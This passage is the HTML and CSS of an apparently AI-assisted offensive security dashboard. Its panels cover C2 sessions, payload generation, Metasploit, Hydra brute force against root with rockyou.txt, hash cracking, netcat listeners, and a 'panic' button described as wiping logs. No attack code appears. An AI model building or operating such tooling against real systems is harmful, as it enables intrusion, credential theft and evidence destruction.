.wd-add-row button{padding:clamp(6px,.5vh,10px) clamp(14px,1.5vw,22px);background:rgba(0,240,255,.08);border:1px solid rgba(0,240,255,.1);color:var(--cyan-bright);border-radius:6px;cursor:pointer;font-size:clamp(.55rem,.65vw,.8rem)}
.wd-add-row button:hover{background:rgba(0,240,255,.15)}
/* ── Net Stats ── */

/* ── Keyboard Hints ── */
.kb-hint{display:inline-block;background:rgba(0,240,255,.06);border:1px solid rgba(0,240,255,.08);padding:0 4px;border-radius:2px;font-size:clamp(.38rem,.45vw,.55rem);color:var(--text-dim);font-family:var(--font-body);line-height:1.6}
/* ── Panic Button ── */
#panic-btn{background:rgba(255,0,77,.08);border:1px solid rgba(255,0,77,.2);color:var(--accent-danger);font-family:var(--font-display);font-size:clamp(.5rem,.6vw,.7rem);padding:clamp(3px,.3vh,5px) clamp(8px,.8vw,12px);border-radius:4px;cursor:pointer;letter-spacing:2px;transition:all .15s;animation:panicPulse 2s ease-in-out infinite}
#panic-btn:hover{background:rgba(255,0,77,.15);border-color:rgba(255,0,77,.4);box-shadow:0 0 16px rgba(255,0,77,.15)}
@keyframes panicPulse{0%,100%{opacity:.7}50%{opacity:1}}
/* ── C2 Session Panel ── */
.c2-table{width:100%;border-collapse:collapse;font-family:var(--font-body);font-size:clamp(.6rem,.7vw,.85rem)}
.c2-table th{text-align:left;padding:clamp(6px,.5vh,10px) clamp(8px,.8vw,14px);color:var(--text-dim);font-family:var(--font-display);letter-spacing:1px;border-bottom:1px solid var(--border-glow);font-weight:400}
.c2-table td{padding:clamp(5px,.4vh,8px) clamp(8px,.8vw,14px);border-bottom:1px solid rgba(0,240,255,.03);color:var(--text-secondary)}
#c2-connect-row{display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap}
#c2-connect-row input{background:rgba(0,0,0,.3);border:1px solid var(--border-glow);color:var(--text-primary);padding:clamp(8px,.7vh,14px) clamp(10px,1vw,16px);font-family:var(--font-body);font-size:clamp(.65rem,.8vw,.95rem);border-radius:6px;outline:none;flex:1;min-width:100px}
#c2-connect-row input:focus{border-color:rgba(0,240,255,.2)}
#c2-connect-row button{padding:clamp(8px,.7vh,14px) clamp(16px,1.8vw,28px);background:rgba(0,240,255,.08);border:1px solid rgba(0,240,255,.1);color:var(--cyan-bright);border-radius:6px;cursor:pointer;font-family:var(--font-ui);font-size:clamp(.6rem,.7vw,.85rem)}
#c2-connect-row button:hover{background:rgba(0,240,255,.15)}
.c2-kill{background:none;border:1px solid rgba(255,0,77,.1);color:var(--accent-danger);padding:3px 10px;border-radius:4px;cursor:pointer;font-size:clamp(.55rem,.65vw,.8rem);font-family:var(--font-body)}
.c2-kill:hover{background:rgba(255,0,77,.1)}
#c2-repl{display:flex;gap:8px;margin-top:10px}
#c2-repl input{flex:1;background:rgba(0,0,0,.3);border:1px solid var(--border-glow);color:var(--text-primary);padding:clamp(8px,.7vh,14px) clamp(10px,1vw,16px);font-family:var(--font-body);font-size:clamp(.65rem,.8vw,.95rem);border-radius:6px;outline:none}
#c2-repl input:focus{border-color:rgba(0,240,255,.2)}
#c2-repl button{padding:clamp(8px,.7vh,14px) clamp(16px,1.8vw,28px);background:rgba(0,240,255,.08);border:1px solid rgba(0,240,255,.1);color:var(--cyan-bright);border-radius:6px;cursor:pointer;font-family:var(--font-ui);font-size:clamp(.6rem,.7vw,.85rem)}
#c2-repl button:hover{background:rgba(0,240,255,.15)}
#c2-output{padding:clamp(10px,.8vh,16px);background:rgba(0,0,0,.3);border:1px solid var(--border-glow);border-radius:6px;margin-top:8px;font-family:var(--font-body);font-size:clamp(.6rem,.7vw,.85rem);color:var(--text-secondary);white-space:pre-wrap;max-height:clamp(120px,18vh,240px);overflow-y:auto}
/* ── Payload Workshop ── */
.pl-row{display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap}
.pl-row select,.pl-row input{background:rgba(0,0,0,.3);border:1px solid var(--border-glow);color:var(--text-primary);padding:clamp(8px,.7vh,14px) clamp(10px,1vw,16px);font-family:var(--font-body);font-size:clamp(.6rem,.7vw,.85rem);border-radius:6px;outline:none;flex:1;min-width:100px}
.pl-row select option{background:var(--bg-primary)}
.pl-row button{padding:clamp(8px,.7vh,14px) clamp(16px,1.8vw,28px);background:rgba(0,240,255,.08);border:1px solid rgba(0,240,255,.1);color:var(--cyan-bright);border-radius:6px;cursor:pointer;font-family:var(--font-ui);font-size:clamp(.6rem,.7vw,.85rem)}
.pl-row button:hover{background:rgba(0,240,255,.15)}
#pl-output{padding:clamp(10px,.8vh,16px);background:rgba(0,0,0,.3);border:1px solid var(--border-glow);border-radius:6px;font-family:var(--font-body);font-size:clamp(.6rem,.7vw,.85rem);color:var(--accent-success);white-space:pre-wrap;word-break:break-all;max-height:clamp(120px,18vh,240px);overflow-y:auto;margin-top:8px}
/* ── Probe Results ── */
.probe-result{padding:clamp(8px,.7vh,14px);background:rgba(0,240,255,.02);border:1px solid var(--border-glow);border-radius:6px;margin-bottom:6px}
.probe-result .prh{display:flex;justify-content:space-between;align-items:center}
.probe-result .prs{font-family:var(--font-display);font-size:clamp(.65rem,.8vw,.95rem);color:var(--text-secondary)}
.probe-result .prr{font-size:clamp(.6rem,.7vw,.85rem);font-family:var(--font-body)}
.probe-result .prd{font-size:clamp(.5rem,.6vw,.7rem);color:var(--text-dim);margin-top:4px}
.probe-result.critical{border-color:rgba(255,0,77,.3);background:rgba(255,0,77,.03)}
.probe-result.critical .prr{color:var(--accent-danger)}
.probe-result.vulnerable{border-color:rgba(255,107,53,.2);background:rgba(255,107,53,.03)}
.probe-result.vulnerable .prr{color:var(--accent-warn)}
.probe-result.potential{border-color:rgba(0,240,255,.08)}
.probe-result.potential .prr{color:var(--accent-warn)}
.probe-result.secure .prr{color:var(--accent-success)}
.probe-threat{font-family:var(--font-display);font-size:clamp(1rem,1.5vw,2rem);color:var(--cyan-bright);text-shadow:var(--text-glow);text-align:center;padding:clamp(10px,.8vh,16px)}
.probe-query-row{display:flex;gap:8px;margin-bottom:10px}
.probe-query-row input{flex:1;background:rgba(0,0,0,.3);border:1px solid var(--border-glow);color:var(--text-primary);padding:clamp(8px,.7vh,14px) clamp(10px,1vw,16px);font-family:var(--font-body);font-size:clamp(.65rem,.8vw,.95rem);border-radius:6px;outline:none}
.probe-query-row input:focus{border-color:rgba(0,240,255,.2)}
.probe-query-row button{padding:clamp(8px,.7vh,14px) clamp(16px,1.8vw,28px);background:rgba(0,240,255,.08);border:1px solid rgba(0,240,255,.1);color:var(--cyan-bright);border-radius:6px;cursor:pointer;font-family:var(--font-ui);font-size:clamp(.6rem,.7vw,.85rem)}
.probe-query-row button:hover{background:rgba(0,240,255,.15)}
/* ── Report Button ── */
.report-btn{display:block;width:100%;padding:clamp(10px,.8vh,16px);background:rgba(0,240,255,.06);border:1px solid var(--border-glow);color:var(--cyan-bright);font-family:var(--font-display);font-size:clamp(.7rem,.85vw,1rem);letter-spacing:2px;border-radius:6px;cursor:pointer;text-align:center;transition:all .15s;margin-top:10px}
.report-btn:hover{background:rgba(0,240,255,.1);border-color:rgba(0,240,255,.2);box-shadow:var(--glow-sm)}
/* ── CRT Scan-line Overlay ── */
#crt-overlay{position:fixed;inset:0;z-index:9999;pointer-events:none;background:repeating-linear-gradient(0deg,rgba(0,0,0,.03) 0,rgba(0,0,0,.03) 1px,transparent 1px,transparent 3px);animation:crtFlicker .1s infinite;opacity:.6}
@keyframes crtFlicker{0%,100%{opacity:.6}50%{opacity:.55}}
#crt-overlay::after{content:'';position:absolute;inset:0;background:radial-gradient(ellipse at center,transparent 60%,rgba(0,0,0,.15) 100%)}
/* ── System Stats Graph ── */
.sg-canvas{width:100%;height:clamp(30px,3.5vh,50px);background:rgba(0,0,0,.2);border:1px solid rgba(0,240,255,.06);border-radius:4px}
.sg-row{display:flex;gap:clamp(4px,.4vw,8px);margin-bottom:clamp(2px,.2vh,4px);align-items:center}
.sg-label{font-size:clamp(.38rem,.45vw,.55rem);color:var(--text-dim);width:clamp(30px,3.5vw,50px);font-family:var(--font-display);letter-spacing:1px;flex-shrink:0}
.sg-val{font-size:clamp(.42rem,.5vw,.6rem);color:var(--cyan-bright);font-family:var(--font-body);width:clamp(24px,2.5vw,36px);text-align:right;flex-shrink:0}
.sg-bar{flex:1;height:clamp(6px,.6vh,10px);background:rgba(0,0,0,.3);border-radius:2px;overflow:hidden;position:relative}
.sg-fill{height:100%;border-radius:2px;transition:width .5s;background:linear-gradient(90deg,rgba(0,240,255,.2),rgba(0,240,255,.6))}
.sg-fill.cpu{background:linear-gradient(90deg,rgba(0,240,255,.2),var(--cyan-bright))}
.sg-fill.mem{background:linear-gradient(90deg,rgba(255,107,53,.2),rgba(255,107,53,.6))}
.sg-fill.dsk{background:linear-gradient(90deg,rgba(0,255,136,.2),rgba(0,255,136,.6))}
/* ── Traffic Graph ── */
#traffic-canvas{width:100%;height:clamp(50px,6vh,90px);background:rgba(0,0,0,.2);border:1px solid rgba(0,240,255,.06);border-radius:4px}
.traffic-table{width:100%;border-collapse:collapse;font-size:clamp(.65rem,.8vw,1rem);margin-top:clamp(6px,.5vh,8px)}
.traffic-table th{text-align:left;padding:clamp(6px,.5vh,10px) clamp(8px,.8vw,14px);color:var(--text-dim);font-family:var(--font-display);letter-spacing:1px;font-weight:400;border-bottom:1px solid rgba(0,240,255,.06)}
.traffic-table td{padding:clamp(6px,.5vh,10px) clamp(8px,.8vw,14px);border-bottom:1px solid rgba(0,240,255,.02);color:var(--text-secondary);font-family:var(--font-body)}
.traffic-table .tv{color:var(--cyan-bright)}
/* ── Threat Ticker ── */
#threat-ticker{overflow:hidden;white-space:nowrap;flex:1;position:relative;height:100%}
#threat-ticker-inner{display:inline-block;white-space:nowrap;animation:tickerScroll 35s linear infinite;padding-left:100%;line-height:clamp(18px,2vh,26px)}
#threat-ticker-inner:hover{animation-play-state:paused}
@keyframes tickerScroll{0%{transform:translateX(0)}100%{transform:translateX(-100%)}}
.tt-item{display:inline-block;margin-right:clamp(20px,2.5vw,40px);font-size:clamp(.55rem,.65vw,.8rem);font-family:var(--font-body)}
.tt-item .tts{display:inline-block;width:clamp(6px,.6vw,8px);height:clamp(6px,.6vw,8px);border-radius:50%;margin-right:4px;vertical-align:middle}
.tt-item .tts.warn{background:var(--accent-warn);box-shadow:0 0 6px var(--accent-warn)}
.tt-item .tts.alert{background:var(--accent-danger);box-shadow:0 0 6px var(--accent-danger)}
.tt-item .tts.info{background:var(--cyan-bright);box-shadow:0 0 6px var(--cyan-bright)}
/* ── Weather Widget ── */
#hud-weather{display:flex;align-items:center;gap:clamp(6px,.5vw,10px);font-size:clamp(.55rem,.65vw,.8rem);font-family:var(--font-body);color:var(--text-secondary);border-left:1px solid rgba(0,240,255,.06);padding-left:clamp(10px,1vw,16px);cursor:pointer}
#hud-weather .wt{font-size:clamp(.7rem,.85vw,1rem);color:var(--cyan-bright);font-family:var(--font-display)}
#hud-weather .wc{color:var(--text-dim);font-size:clamp(.5rem,.6vw,.7rem)}
/* ── Radial Menu ── */
#radial-btn{position:fixed;bottom:clamp(12px,1.5vh,20px);right:clamp(12px,1.5vw,20px);z-index:100;width:clamp(44px,4.5vw,56px);height:clamp(44px,4.5vw,56px);border-radius:50%;background:rgba(0,240,255,.06);border:1px solid rgba(0,240,255,.12);color:var(--cyan-bright);font-size:clamp(1rem,1.2vw,1.4rem);cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .2s;font-family:var(--font-display);box-shadow:0 0 20px rgba(0,240,255,.06)}
#radial-btn:hover{background:rgba(0,240,255,.12);border-color:rgba(0,240,255,.25);box-shadow:0 0 30px rgba(0,240,255,.12);transform:scale(1.05)}
#radial-menu{position:fixed;z-index:99;display:none;pointer-events:none}
#radial-menu.show{display:block;pointer-events:auto}
.rm-item{position:absolute;width:clamp(36px,3.5vw,46px);height:clamp(36px,3.5vw,46px);border-radius:50%;background:rgba(7,11,23,.95);border:1px solid rgba(0,240,255,.1);color:var(--text-secondary);font-size:clamp(.7rem,.8vw,1rem);display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all .2s;font-family:var(--font-display)}
.rm-item:hover{background:rgba(0,240,255,.1);border-color:rgba(0,240,255,.2);color:var(--cyan-bright);transform:scale(1.1);box-shadow:0 0 16px rgba(0,240,255,.08)}
.rm-label{position:absolute;color:var(--text-dim);font-size:clamp(.35rem,.4vw,.5rem);font-family:var(--font-body);white-space:nowrap;text-align:center;pointer-events:none}
/* ── Drag Handle ── */
.drag-handle{cursor:grab;opacity:.3;transition:opacity .15s;user-select:none;padding:0 4px;font-size:clamp(.5rem,.6vw,.7rem);color:var(--text-dim);flex-shrink:0}
.drag-handle:hover{opacity:.7}
.drag-handle:active{cursor:grabbing}
.dragging{opacity:.5;outline:1px dashed rgba(0,240,255,.2)}
/* ── Tour Overlay ── */
.tour-overlay{position:fixed;inset:0;z-index:200;background:rgba(7,11,23,0.55);backdrop-filter:blur(1px);display:none;pointer-events:auto}
.tour-overlay.show{display:block}
.tour-bubble{position:fixed;z-index:202;background:var(--bg-primary);border:1px solid var(--cyan-bright);border-radius:8px;padding:16px 22px;max-width:380px;box-shadow:var(--glow-lg),0 0 40px rgba(0,240,255,0.08);font-size:.95rem;pointer-events:auto;display:none;line-height:1.6}
.tour-bubble.show{display:block}
.tour-bubble-title{color:var(--cyan-bright);font-family:var(--font-display);font-size:1.05rem;letter-spacing:1px;margin-bottom:8px;text-shadow:var(--text-glow)}
.tour-bubble-text{color:var(--text-secondary);font-size:.88rem;margin-bottom:10px}
.tour-bubble-text .kb-hint{font-size:.8rem}
.tour-bubble-dots{display:flex;gap:5px;margin-bottom:10px}
.tour-dot{width:7px;height:7px;border-radius:50%;background:var(--text-dim);transition:all .15s;cursor:pointer}
.tour-dot.active{background:var(--cyan-bright);box-shadow:0 0 6px var(--cyan-bright)}
.tour-bubble-actions{display:flex;align-items:center}
.tour-btn{background:var(--bg-secondary);border:1px solid var(--cyan-dim);color:var(--text-secondary);padding:6px 14px;border-radius:4px;cursor:pointer;font-size:.82rem;font-family:var(--font-ui);transition:all .15s}
.tour-btn:hover{border-color:var(--cyan-bright);color:var(--cyan-bright)}
.tour-btn-primary{background:rgba(0,240,255,0.1);border-color:var(--cyan-bright);color:var(--cyan-bright);font-weight:600}
.tour-btn-primary:hover{background:rgba(0,240,255,0.2);box-shadow:0 0 12px rgba(0,240,255,0.1)}
.tour-btn-skip{background:none;border-color:transparent;color:var(--text-dim);font-size:.65rem}
.tour-btn-skip:hover{color:var(--text-secondary)}
.tour-highlight{animation:tourPulse 1.8s ease-in-out infinite}
@keyframes tourPulse{0%,100%{box-shadow:0 0 0 0 rgba(0,240,255,0.5)}50%{box-shadow:0 0 0 8px rgba(0,240,255,0)}}
.tour-trigger-btn{background:none;border:1px solid rgba(0,240,255,0.1);color:var(--text-dim);font-family:var(--font-display);font-size:clamp(.5rem,.6vw,.7rem);padding:2px 8px;border-radius:4px;cursor:pointer;transition:all .15s;letter-spacing:1px}
.tour-trigger-btn:hover{color:var(--cyan-bright);border-color:rgba(0,240,255,0.2)}
</style>
</head>
<body>
<div id="crt-overlay"></div>
<div id="boot-screen">
  <div class="bs-logo">K//AI</div>
  <div class="bs-line">INITIALIZING <span class="highlight">COMMAND DECK</span> v1.0</div>
  <div class="bs-line" style="animation-delay:.3s">LOADING <span class="highlight">NEURAL INTERFACE</span></div>
  <div class="bs-line" style="animation-delay:.6s">CALIBRATING <span class="highlight">HOLOGRAPHIC DISPLAY</span></div>
  <div class="bs-line" style="animation-delay:.9s">ESTABLISHING <span class="highlight">SECURE CONNECTION</span></div>
  <div class="bs-bar"><div class="f"></div></div>
</div>
<div id="vignette"></div>
<div id="scanlines"></div>
<canvas id="particles-canvas"></canvas>
<div id="toast-container"></div>

<div id="hud-bar">
  <div class="hud-left">
    <div class="hud-brand"><span>K</span>//AI</div>
    <div class="hud-status"><span class="hud-dot"></span><span>SYS.ONLINE</span></div>
  </div>
  <div class="hud-gauges">
    <div class="gauge"><span class="gl">Hosts</span><span class="gv" id="g-hosts">0</span></div>
    <div class="gauge"><span class="gl">Scan</span><span class="gv" id="g-scan">IDLE</span></div>
    <div class="gauge"><span class="gl">CPU</span>
      <div class="gb"><div class="f" id="g-cpu" style="width:20%"></div></div>
    </div>
    <div class="gauge"><span class="gl">MEM</span>
      <div class="gb"><div class="f" id="g-mem" style="width:30%"></div></div>
    </div>
  </div>
  <div class="hud-right">
    <button id="panic-btn" onclick="triggerPanic()" title="Emergency panic — kill processes, wipe logs, enable firewall">&#9888; PANIC</button>
    <div id="hud-weather" onclick="updateWeather()"><span class="wt" id="hw-temp">--</span><span class="wc" id="hw-cond"></span></div>
    <div class="hud-clock" id="clock">00:00:00</div>
    <button class="tour-trigger-btn" onclick="showTour()" title="Start guided tour">&#63;</button>
  </div>
</div>

<div id="main">
  <!-- Left Sidebar: Operations -->
  <div id="sidebar-left">
    <div class="sidebar-title">Operations</div>
    <div class="action-btn" data-op="netscan" onclick="runOp('netscan')"><span class="ai">&#9733;</span><span class="al">Network Scan</span><span class="ac" id="cd-netscan"></span></div>
    <div class="action-btn" data-op="portscan" onclick="runOp('portscan')"><span class="ai">&#9878;</span><span class="al">Port Scan</span><span class="ac" id="cd-portscan"></span></div>
    <div class="action-btn" data-op="webrecon" onclick="runOp('webrecon')"><span class="ai">&#9783;</span><span class="al">Web Recon</span><span class="ac" id="cd-webrecon"></span></div>
    <div class="action-btn" data-op="hunt" onclick="runOp('hunt')"><span class="ai">&#9775;</span><span class="al">Hunt Target</span><span class="ac" id="cd-hunt"></span></div>
    <div class="action-btn" data-op="ghost" onclick="runOp('ghost')"><span class="ai">&#9789;</span><span class="al">Ghost Mode</span><span class="ac" id="cd-ghost"></span></div>
    <div class="sidebar-title">&#9881; Forensics</div>
    <div class="action-btn" data-op="processes" onclick="runOp('processes')"><span class="ai">&#9776;</span><span class="al">Process Tree</span><span class="ac" id="cd-processes"></span></div>
    <div class="action-btn" data-op="services" onclick="runOp('services')"><span class="ai">&#9880;</span><span class="al">Service Auditor</span><span class="ac" id="cd-services"></span></div>
    <div class="sidebar-title">&#9729; Network</div>
    <div class="action-btn" data-op="smb" onclick="runOp('smb')"><span class="ai">&#9773;</span><span class="al">SMB Shares</span><span class="ac" id="cd-smb"></span></div>
    <div class="action-btn" data-op="watchdogs" onclick="runOp('watchdogs')"><span class="ai">&#9888;</span><span class="al">Watchdogs</span><span class="ac" id="cd-watchdogs"></span></div>
    <div class="sidebar-title">&#9762; Offense</div>
    <div class="action-btn" data-op="msf" onclick="runOp('msf')"><span class="ai">&#9762;</span><span class="al">Metasploit</span><span class="ac" id="cd-msf"></span></div>
    <div class="action-btn" data-op="webscan" onclick="runOp('webscan')"><span class="ai">&#9783;</span><span class="al">Web Scan</span><span class="ac" id="cd-webscan"></span></div>
    <div class="action-btn" data-op="c2" onclick="runOp('c2')"><span class="ai">&#9775;</span><span class="al">C2 Remote</span><span class="ac" id="cd-c2"></span></div>
    <div class="action-btn" data-op="payload" onclick="runOp('payload')"><span class="ai">&#9881;</span><span class="al">Payload Gen</span><span class="ac" id="cd-payload"></span></div>
    <div class="action-btn" data-op="probe" onclick="runOp('probe')"><span class="ai">&#9880;</span><span class="al">Probe Device</span><span class="ac" id="cd-probe"></span></div>
    <div class="action-btn" data-op="report" onclick="runOp('report')"><span class="ai">&#9776;</span><span class="al">Op Report</span><span class="ac" id="cd-report"></span></div>
    <div class="action-btn" data-op="traffic" onclick="runOp('traffic')"><span class="ai">&#9775;</span><span class="al">Live Traffic</span><span class="ac" id="cd-traffic"></span></div>
    <div class="action-btn" data-op="tools" onclick="runOp('tools')"><span class="ai">&#9881;</span><span class="al">Tool Kit</span><span class="ac" id="cd-tools"></span></div>
    <div class="action-btn" data-op="status" onclick="runOp('status')"><span class="ai">&#9881;</span><span class="al">System Status</span><span class="ac" id="cd-status"></span></div>
    <div class="sidebar-title" style="margin-top:auto;margin-bottom:0;padding-top:clamp(4px,.5vh,8px)">&#9776; Memory</div>
    <div class="action-btn" data-op="recall" onclick="runOp('recall')"><span class="ai">&#9880;</span><span class="al">Recall Memory</span><span class="ac" id="cd-recall"></span></div>
    <div class="rs-divider" style="margin:4px 0"></div>
    <div class="action-btn" onclick="toggleMap()" title="Toggle network map panel"><span class="ai">&#127758;</span><span class="al">Toggle Map</span><span class="ac"></span></div>
    <div class="rs-title" style="font-size:.6rem;padding:4px 4px;margin-bottom:2px">TASKS &amp; ALERTS</div>
    <div id="task-list" style="max-height:clamp(80px,10vh,140px);overflow-y:auto"></div>
    <div class="sidebar-footer">KAIAI v1.0 &mdash; COMMAND DECK</div>
  </div>

  <!-- Center: Tabs (Terminal / Chat / Results) - BIG & CENTERED -->
  <div id="center-stage">
    <div id="tab-area">
      <div id="tab-header">
        <button class="tab-btn active" data-tab="terminal">Terminal</button>
        <button class="tab-btn" data-tab="chat">Chat</button>
        <button class="tab-btn" data-tab="results">Results</button>
        <span class="tab-divider"></span>
        <button class="tab-btn" data-tab="processes">Procs</button>
        <button class="tab-btn" data-tab="services">Services</button>
        <button class="tab-btn" data-tab="smb">SMB</button>
        <button class="tab-btn" data-tab="watchdogs">Watch</button>
        <span class="tab-divider"></span>
        <button class="tab-btn" data-tab="msf">MSF</button>
        <button class="tab-btn" data-tab="webscan">Web Scan</button>
        <button class="tab-btn" data-tab="tools">Tool Kit</button>
        <span class="tab-divider"></span>
        <button class="tab-btn" data-tab="c2">C2</button>
        <button class="tab-btn" data-tab="payload">Payload</button>
        <button class="tab-btn" data-tab="probe">Probe</button>
        <button class="tab-btn" data-tab="traffic">Traffic</button>
        <button class="tab-btn" data-tab="report">Report</button>
        <button id="popout-btn" onclick="popOutCurrent()" title="Pop out active panel">&#x2395;</button>
      </div>
      <div class="tab-panel active" id="tp-terminal" style="display:flex;flex-direction:column">
        <div style="flex:1;overflow-y:auto"></div>
        <div id="term-status-bar"><span class="ts-text"></span><button class="ts-cancel" onclick="var k=Object.keys(_activeOps);if(k.length)termCancelOp(k[0])">&#10005; Cancel</button></div>
      </div>
      <div class="tab-panel" id="tp-chat">
        <div id="chat-log"></div>
        <div id="chat-input-row">
          <input type="text" id="chat-input" placeholder="type a command or ask kai...">
          <button id="chat-send">SEND</button>
        </div>
      </div>
      <div class="tab-panel" id="tp-results"></div>
      <div class="tab-panel" id="tp-processes"><div class="proc-tree" id="proc-tree-root"><div style="color:var(--text-dim);font-size:.85rem">Click Process Tree in sidebar to load</div></div></div>
      <div class="tab-panel" id="tp-services"><input class="svc-search" id="svc-search" placeholder="filter services..." oninput="renderServices()"><div style="overflow-y:auto;flex:1" id="svc-table-wrap"><table class="svc-table"><thead><tr><th>Name</th><th>Status</th><th>StartType</th><th>Action</th></tr></thead><tbody id="svc-tbody"></tbody></table></div></div>
      <div class="tab-panel" id="tp-smb"><div class="smb-remote-row"><input id="smb-target" placeholder="target IP (e.g. 192.168.1.100)" value=""><button onclick="scanSmb()">Scan Remote</button></div><div id="smb-local-title" style="color:var(--cyan-bright);font-family:var(--font-display);font-size:.85rem;letter-spacing:1px;margin-bottom:6px">LOCAL SHARES</div><div id="smb-local-list"></div><div id="smb-remote-title" style="color:var(--cyan-bright);font-family:var(--font-display);font-size:.85rem;letter-spacing:1px;margin:8px 0 6px;display:none">REMOTE SHARES</div><div id="smb-remote-list"></div></div>
      <div class="tab-panel" id="tp-watchdogs"><div class="wd-add-row"><select id="wd-type"><option value="arp">ARP Watch</option><option value="port">Port Watch</option></select><input id="wd-target" placeholder="IP or port number"><button onclick="addWatchdog()">Add</button></div><div id="wd-list"></div></div>
      <div class="tab-panel" id="tp-msf">
        <div style="display:flex;flex-direction:column;height:100%;gap:6px">
          <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center">
            <button onclick="msfConnect()" style="padding:4px 12px">Connect</button>
            <button onclick="msfDisconnect()" style="padding:4px 12px">Disconnect</button>
            <span id="msf-status" style="color:var(--text-dim);font-size:.75rem">Disconnected</span>
            <button onclick="msfStartDaemon()" style="padding:4px 12px">Start Daemon</button>
            <button onclick="msfStopDaemon()" style="padding:4px 12px">Stop Daemon</button>
          </div>
          <div id="msf-sessions" style="background:var(--bg-surface);border:1px solid var(--border);border-radius:4px;padding:6px;max-height:120px;overflow-y:auto;font-size:.75rem;display:none">
            <div style="color:var(--cyan-bright);margin-bottom:4px">ACTIVE SESSIONS</div>
            <div id="msf-session-list"></div>
          </div>
          <div id="msf-console" style="flex:1;display:flex;flex-direction:column;min-height:0">
            <pre id="msf-output" style="flex:1;background:#0a0a0a;border:1px solid var(--border);border-radius:4px;padding:8px;overflow-y:auto;font-size:.72rem;margin:0;white-space:pre-wrap;font-family:var(--font-mono);min-height:120px"></pre>
            <div style="display:flex;gap:4px;margin-top:4px">
              <input id="msf-console-input" placeholder="msf6 >" style="flex:1" onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();msfSendCommand()}">
              <button onclick="msfSendCommand()" style="padding:4px 12px">Send</button>
              <button onclick="msfCreateConsole()" style="padding:4px 12px">New Console</button>
            </div>
          </div>
        </div>
      </div>
      <div class="tab-panel" id="tp-webscan">
        <div style="display:flex;flex-direction:column;height:100%;gap:6px">
          <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center">
            <button onclick="zapStart()" style="padding:4px 12px">Start ZAP</button>
            <button onclick="zapStop()" style="padding:4px 12px">Stop ZAP</button>
            <span id="zap-status" style="color:var(--text-dim);font-size:.75rem">Stopped</span>
          </div>
          <div style="display:flex;gap:4px">
            <input id="zap-url" placeholder="target URL (e.g. http://192.168.1.100)" style="flex:1">
            <button onclick="zapStartScan()" style="padding:4px 12px">Spider</button>
            <button onclick="zapStartActiveScan()" style="padding:4px 12px">Active Scan</button>
            <button onclick="zapFullScan()" style="padding:4px 12px;background:var(--accent-danger)">Full Scan</button>
          </div>
          <div style="display:flex;gap:4px;align-items:center;font-size:.72rem">
            <span>Spider: <span id="zap-spider-progress">0%</span></span>
            <span style="margin-left:12px">Active: <span id="zap-ascan-progress">0%</span></span>
            <button onclick="zapGetAlerts()" style="padding:4px 12px;margin-left:auto">Get Alerts</button>
            <button onclick="zapReport()" style="padding:4px 12px">HTML Report</button>
          </div>
          <div id="zap-alert-summary" style="display:flex;gap:12px;font-size:.72rem"></div>
          <pre id="zap-output" style="flex:1;background:#0a0a0a;border:1px solid var(--border);border-radius:4px;padding:8px;overflow-y:auto;font-size:.72rem;margin:0;white-space:pre-wrap;font-family:var(--font-mono);min-height:120px"></pre>
        </div>
      </div>
      <div class="tab-panel" id="tp-tools">
        <div style="display:flex;flex-direction:column;height:100%;gap:6px;font-size:.75rem;overflow-y:auto">
          <div class="tk-section">
            <div class="tk-title" style="color:var(--cyan-bright);margin-bottom:4px">&#9881; HYDRA — Password Brute Force</div>
            <div class="tk-row" style="display:flex;gap:4px;flex-wrap:wrap">
              <input id="tk-hydra-target" placeholder="target IP" style="width:110px">
              <select id="tk-hydra-service"><option>ssh</option><option>ftp</option><option>rdp</option><option>smb</option><option>http-post-form</option></select>
              <input id="tk-hydra-user" placeholder="username" value="root" style="width:80px">
              <input id="tk-hydra-wordlist" placeholder="wordlist path" value="/usr/share/wordlists/rockyou.txt" style="flex:1;min-width:100px">
              <button onclick="tkHydra()" style="padding:4px 10px">Crack</button>
            </div>
          </div>
          <div class="tk-section">
            <div class="tk-title" style="color:var(--cyan-bright);margin-bottom:4px">&#9881; NETCAT — Port Scan / Banner Grab / Listen</div>
            <div class="tk-row" style="display:flex;gap:4px;flex-wrap:wrap">
              <input id="tk-nc-target" placeholder="target IP" style="width:110px">
              <input id="tk-nc-port" placeholder="port(s)" style="width:80px">
              <select id="tk-nc-mode"><option value="scan">Port Scan</option><option value="banner">Banner Grab</option><option value="listen">Listen</option></select>
              <button onclick="tkNetcat()" style="padding:4px 10px">Run</button>
            </div>
          </div>
          <div class="tk-section">
            <div class="tk-title" style="color:var(--cyan-bright);margin-bottom:4px">&#9881; JOHN / HASHCAT — Hash Cracking</div>
            <div class="tk-row" style="display:flex;gap:4px;flex-wrap:wrap">
              <input id="tk-hash" placeholder="hash string" style="flex:1;min-width:150px">
              <select id="tk-hash-type"><option value="john">John (auto-detect)</option><option value="hashcat">Hashcat (mode 0)</option></select>
              <button onclick="tkCrack()" style="padding:4px 10px">Crack</button>
            </div>
          </div>
          <div class="tk-section">
            <div class="tk-title" style="color:var(--cyan-bright);margin-bottom:4px">&#9881; SEARCHSPLOIT — Exploit Lookup</div>
            <div class="tk-row" style="display:flex;gap:4px;flex-wrap:wrap">
              <input id="tk-search" placeholder="search query (e.g. apache 2.4.49)" style="flex:1;min-width:150px">
              <button onclick="tkSearchsploit()" style="padding:4px 10px">Search</button>
            </div>
          </div>
          <div class="tk-section">
            <div class="tk-title" style="color:var(--cyan-bright);margin-bottom:4px">&#9881; NMAP — Quick Scan</div>
            <div class="tk-row" style="display:flex;gap:4px;flex-wrap:wrap">
              <input id="tk-nmap-target" placeholder="target IP or subnet" style="width:140px">
              <input id="tk-nmap-flags" placeholder="flags" value="-sV -T4" style="flex:1;min-width:80px">
              <button onclick="tkNmap()" style="padding:4px 10px">Scan</button>
            </div>
          </div>
          <pre id="tk-output" style="flex:1;background:#0a0a0a;border:1px solid var(--border);border-radius:4px;padding:8px;overflow-y:auto;font-size:.72rem;margin:0;white-space:pre-wrap;font-family:var(--font-mono);min-height:100px"></pre>
        </div>
      </div>
      <div class="tab-panel" id="tp-c2">
        <div id="c2-connect-row">
          <input id="c2-host" placeholder="hostname or IP">
          <input id="c2-cred" placeholder="username">
          <button onclick="c2Connect()">Connect</button>
        </div>
        <div id="c2-sessions"></div>
        <div id="c2-repl" style="display:none">
